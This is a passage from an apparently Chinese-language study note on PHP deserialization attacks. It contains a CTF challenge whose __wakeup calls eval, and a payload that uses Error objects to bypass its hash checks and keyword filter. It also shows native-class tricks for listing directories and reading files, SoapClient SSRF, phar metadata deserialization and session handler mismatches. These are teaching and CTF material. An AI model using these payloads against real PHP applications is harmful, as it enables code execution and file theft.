<span class=\"token variable\">$syc</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$lover</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">syc</span> <span class=\"token operator\">!=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">lover</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">syc</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">lover</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">syc</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span> <span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">lover</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n           <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\&lt;\\?php|\\(|\\)|\\\"|\\'/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">syc</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$match</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n               <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">syc</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n               <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Try Hard !!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'great'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'great'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>payload：</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">SYCLOVER</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$syc</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$lover</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$payload</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"?>&lt;?=include~\"</span><span class=\"token operator\">.</span><span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"%d0%99%93%9e%98\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"?>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">/*\n或使用 [~(取反)][!% FF] 的形式，\n即: $payload = \"?>&lt;?=include [~\".urldecode (\"% D0%99%93%9E%98\").\"][!.urldecode (\"% FF\").\"]?>\";    \n\n$payload = \"?>&lt;?=include $_GET [_]?>\"; \n*/</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$payload</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$payload</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">SYCLOVER</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$c</span><span class=\"token operator\">-></span><span class=\"token property\">syc</span><span class=\"token operator\">=</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$c</span><span class=\"token operator\">-></span><span class=\"token property\">lover</span><span class=\"token operator\">=</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<h3 id=\"目录遍历\"><a class=\"anchor\" href=\"#目录遍历\">#</a> 目录遍历</h3>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">可遍历目录类有以下几个：\nDirectoryIterator 类\nFilesystemIterator 类\nGlobIterator 类<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<h4 id=\"directoryiterator-类\"><a class=\"anchor\" href=\"#directoryiterator-类\">#</a> DirectoryIterator 类</h4>\n<p>DirectoryIterator 类提供了一个查看文件系统目录内容的简单接口，</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//error_reporting(0);</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">DirectoryIterator</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'glob:///*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span><span class=\"token operator\">-></span><span class=\"token function\">getFilename</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101201448743.png\" alt=\"image-20221101201448743\" /></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//error_reporting(0);</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">DirectoryIterator</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'glob:///*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span><span class=\"token operator\">-></span><span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101202542909.png\" alt=\"image-20221101202542909\" /></p>\n<h4 id=\"filesystemiterator-类\"><a class=\"anchor\" href=\"#filesystemiterator-类\">#</a> FilesystemIterator 类</h4>\n<p>使用方法和 DirectoryIterator 类一样</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//error_reporting(0);</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FilesystemIterator</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span><span class=\"token operator\">-></span><span class=\"token function\">getFilename</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101201842238.png\" alt=\"image-20221101201842238\" /></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//error_reporting(0);</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FilesystemIterator</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span><span class=\"token operator\">-></span><span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101202433304.png\" alt=\"image-20221101202433304\" /></p>\n<h4 id=\"globlterator类\"><a class=\"anchor\" href=\"#globlterator类\">#</a> Globlterator 类</h4>\n<p>使用方法相同这里不再赘述</p>\n<h3 id=\"读取文件\"><a class=\"anchor\" href=\"#读取文件\">#</a> 读取文件</h3>\n<p>目录遍历找到 flag 然后肯定是想办法去读呗</p>\n<h4 id=\"splfileobject-类\"><a class=\"anchor\" href=\"#splfileobject-类\">#</a> SplFileObject 类</h4>\n<p>SplFileInfo 类为单个文件的信息提供了高级的面向对象接口</p>\n<blockquote>\n<p>SplFileInfo::__toString — Returns the path to the file as a string // 将文件路径作为字符串返回</p>\n</blockquote>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$context</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SplFileObject</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'test.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$context</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101203225373.png\" alt=\"image-20221101203225373\" /></p>\n<h3 id=\"soapclient-ssrf\"><a class=\"anchor\" href=\"#soapclient-ssrf\">#</a> SoapClient--SSRF</h3>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">SOAP 是基于 XML 的简易协议，可使应用程序在 HTTP 之上进行信息交换。\n或者更简单地说：SOAP 是用于访问网络服务的协议。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p>在 <code>SoapClient</code>  类中，还有一个我们非常熟悉的魔术方法， <code>__call()</code>  方法，当调用类中不存在的方法时就会触发，当触发这个方法后，它就会向 <code>location</code>  中的目标 URL 发送一个 <code>soap</code>  请求</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">public SoapClient :: SoapClient(mixed $wsdl [，array $options ])<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">SoapClient</span><span class=\"token punctuation\">(</span><span class=\"token constant\">null</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'location'</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'http://192.168.9.129:9876/'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'uri'</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'test'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre></p>\n<h2 id=\"phar反序列化\"><a class=\"anchor\" href=\"#phar反序列化\">#</a> phar 反序列化</h2>\n<h3 id=\"前言-2\"><a class=\"anchor\" href=\"#前言-2\">#</a> 前言</h3>\n<p>来自 Secarma 的安全研究员 Sam Thomas 讲述了一种攻击 PHP 应用的方式，利用 Phar:// 伪协议读取 phar 文件时，会反序列化 meta-data 储存的信息。</p>\n<p>想要</p>\n<h3 id=\"pharphar\"><a class=\"anchor\" href=\"#pharphar\">#</a> PHAR&amp;phar://</h3>\n<p>phar 是 php 中一种类似于 java 的 jar 的一种打包文件，在从 5.3 开始的 php 版本中是默认开启的，一个 php 程序可以打包成 phar 在 FPM 中直接运行，说白了他也是压缩包的一种，这里主要是为了实现反序列化，那么就不得不提到 phar://,phar:// 是流包装的一种，流包装为了提高读写效率对字节流或者字符流进行二次处理，这个过程就是包装流或者说处理流</p>\n<h3 id=\"phar的文件结构\"><a class=\"anchor\" href=\"#phar的文件结构\">#</a> PHAR 的文件结构</h3>\n<p>使用 phar 进行反序列化，那么了解 phar 的文件结构是必不可少的（先扔张图）</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101222716073.png\" alt=\"image-20221101222716073\" /></p>\n<p>一个 phar 文件主要包含 4 个部分</p>\n<h4 id=\"a-stub\"><a class=\"anchor\" href=\"#a-stub\">#</a> a stub</h4>\n<p>这一部分的文件结构是 XXX&lt;?php __HALT_COMPILER (); ?&gt; 前面是什么内容都无所谓，但是必须以__HALT_COMPILER (); ?&gt; 结尾，这是 phar 的标识部分，与后缀无关，这里满足就当成 phar 文件来解析</p>\n<h4 id=\"a-manifest-describing-the-contents\"><a class=\"anchor\" href=\"#a-manifest-describing-the-contents\">#</a> a manifest describing the contents</h4>\n<p>这部分就是反序列化漏洞产生的关键，这里存放了如下的信息</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101223552257.png\" alt=\"image-20221101223552257\" /></p>\n<p>其中的 Meta-data 部分就是被序列化的部分</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221102211445480.png\" alt=\"image-20221102211445480\" /></p>\n<h4 id=\"the-file-contents\"><a class=\"anchor\" href=\"#the-file-contents\">#</a> the file contents</h4>\n<p>被压缩的文件内容，这里没有啥用，可以随便写</p>\n<h4 id=\"a-signature-for-verifying-phar-integrity\"><a class=\"anchor\" href=\"#a-signature-for-verifying-phar-integrity\">#</a> a signature for verifying phar integrity</h4>\n<p>这是一个签名，放在文件末尾，格式：</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221102211748215.png\" alt=\"image-20221102211748215\" /></p>\n<h2 id=\"session反序列化\"><a class=\"anchor\" href=\"#session反序列化\">#</a> session 反序列化</h2>\n<p>在网络应用中，session 是维持会话的一种形式，一种服务端的机制（详细看 xss 中会话劫持中有较详细描述）</p>\n<h3 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h3>\n<p>漏洞的产生主要是由下面三种反序列化引擎不同产生的漏洞（这里指序列化和反序列化使用的引擎不同导致）</p>\n<h3 id=\"session的工作流程\"><a class=\"anchor\" href=\"#session的工作流程\">#</a> session 的工作流程</h3>\n<p>首先 session_start () 函数开启一个会话，去检测 PHPSESSID</p>\n<ol>\n<li>如果 cookie 存在就获取到 PHPSESSID</li>\n<li>如果不存在就生成一个 PHPSESSID 用以标识用户的登录状态，以 Cookie 的形式保存到客户端</li>\n<li>初始化 $_SESSION 变量</li>\n<li>程序运行结束，将 $_SESSION 中的数据序列化后存储到 PHPSESSID 文件中</li>\n<li>将包含 PHPSESSID 值的 cookie 通过响应头返回给浏览器</li>\n<li>再次请求时已经有 SESSID 于是去序列化读取文件将序列化的数据存放到 $_SESSION 变量中</li>\n</ol>\n<h3 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 原理</h3>\n<p>首先来看一看 php.ini 中的一些关于 Session 的配置</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">session.save_path&#x3D;&quot;&quot; --设置session的存储路径\nsession.save_handler&#x3D;&quot;&quot;--设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)\nsession.auto_start boolen--指定会话模块是否在请求开始时启动一个会话默认为0不启动\nsession.serialize_handler string--定义用来序列化&#x2F;反序列化的处理器名字。默认使用php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221102222741453.png\" alt=\"image-20221102222741453\" /></p>\n<p>在这里有相关配置的详细信息</p>\n<p>上面有提到，session 反序列化漏洞的产生是因为序列化和反序列化使用的引擎不同导致的，这里简单介绍一下三种不同的引擎</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值\n\nphp:存储方式是，键名+竖线+经过serialize()函数序列处理的值\n\nphp_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>这里写一个简单的 demo</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'session.serialize_handler'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//ini_set('session.serialize_handler', 'php_binary');</span>\n<span class=\"token comment\">//ini_set('session.serialize_handler', 'php_serialize');</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'demo'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'test'</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221102224208754.png\" alt=\"image-20221102224208754\" /></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//ini_set('session.serialize_handler', 'php');</span>\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'session.serialize_handler'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'php_binary'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//ini_set('session.serialize_handler', 'php_serialize');</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'demo'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'test'</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221102224327134.png\" alt=\"image-20221102224327134\" /></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//ini_set('session.serialize_handler', 'php');</span>\n<span class=\"token comment\">//ini_set('session.serialize_handler', 'php_binary');</span>\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'session.serialize_handler'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'php_serialize'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'demo'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'test'</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221102224411072.png\" alt=\"image-20221102224411072\" /></p>\n<p>上面主要是简单的展示一下几个引擎的不同点，接下来接着对整个产生的过程进行一个简单的测试</p>\n<p>test.php</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'session.serialize_handler'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'php_serialize'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'demo'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'demo'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>test2.php</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'session.serialize_handler'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Demo</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$demo</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">demo</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>payload</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Demo</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$demo</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"success\"</span><span class=\"token punctuation\">;</span>    \n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token 